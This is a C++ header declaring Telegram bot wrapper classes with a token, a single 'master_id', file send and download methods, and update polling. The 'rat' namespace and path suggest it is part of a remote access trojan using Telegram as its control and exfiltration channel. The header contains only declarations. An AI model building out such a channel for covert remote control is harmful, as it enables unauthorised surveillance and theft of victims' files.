/*rat_tbot/include/tbot/types.hpp*/
#pragma once

#include <limits>
#include <array>
#include <string>
#include <filesystem>
#include <cstdint>

#include <simdjson.h>

#include "rat/networking.hpp"
#include "rat/tbot/types.hpp"

#define KB 1024

#define HTTP_RESPONSE_BUFFER_SIZE 64 * KB
#define TELEGRAM_BOT_API_BASE_URL "https://api.telegram.org/bot"
#define TELEGRAM_API_URL          "https://api.telegram.org"

namespace rat::tbot {



class BaseBot {

private:
    std::string token;
    int64_t master_id;
    uint16_t update_interval;

    std::string sending_message_url_base;
    std::string sending_document_url;
    std::string sending_photo_url;
    std::string sending_audio_url;
    std::string sending_video_url;
    std::string sending_voice_url;

    std::string getting_file_url;
protected:
    int64_t last_update_id;
    
    simdjson::ondemand::parser simdjson_parser;

    char http_buffer[HTTP_RESPONSE_BUFFER_SIZE + simdjson::SIMDJSON_PADDING] = {0};
    size_t recieved_data_size  = 0;
    
public:
    /* This is because the bot gets copied inside certain threads, use its client to limit creating another handler */
    rat::networking::Client curl_client;

    // Constructors
    BaseBot() {};
    BaseBot(const std::string& arg_Token, int64_t Master_Id, uint8_t Telegram_Connection_Timeout = 20);
    BaseBot(const BaseBot& Other_Bot); // constructs new Client with its own CURL handle, copies everything, very expensive

    // Getters
    std::string getToken() const;
    int64_t getMasterId() const;
    int64_t getLastUpdateId() const;

    void setOffset(); // only for bots handling updates, not for sender-only bots

    std::string getBotFileUrl() const;
    void setUpdateIterval(uint16_t Update_Interval);
    
    void setLastUpdateId(int64_t arg_Id) ; 
    // Sending methods
    BotResponse sendMessage(const std::string& Text_Message);

    BotResponse sendFile(const std::filesystem::path& File_Path, const std::string& arg_Caption = "");
    BotResponse sendPhoto(const std::filesystem::path& Photo_Path, const std::string& arg_Caption = "");
    BotResponse sendAudio(const std::filesystem::path& Audio_Path, const std::string& arg_Caption = "");
    BotResponse sendVideo(const std::filesystem::path& Video_Path, const std::string& arg_Caption = "");
    BotResponse sendVoice(const std::filesystem::path& Voice_Path, const std::string& arg_Caption = "");

    bool downloadFile(const std::string& File_Id, const std::filesystem::path& Out_Path);
};

/* This is the bot that listens for updates and parses them */
class Bot : public BaseBot {

private: 
    std::string getting_update_url;
protected:

    File parseFile(simdjson::ondemand::value& file_val, const std::string& type = "document");
    void extractFilesFromMessage(simdjson::ondemand::object& message_obj, Message& message);

    Message parseMessage(simdjson::ondemand::value& message_val);

    Update parseJsonToUpdate();
public:
    Bot() {};
    Bot(const std::string& arg_Token, int64_t Master_Id, uint8_t Telegram_Connection_Timeout = 20);
    
    

    
    Update getUpdate(); // override if BaseBot has virtual equivalent
};
} // namespace rat::tbot


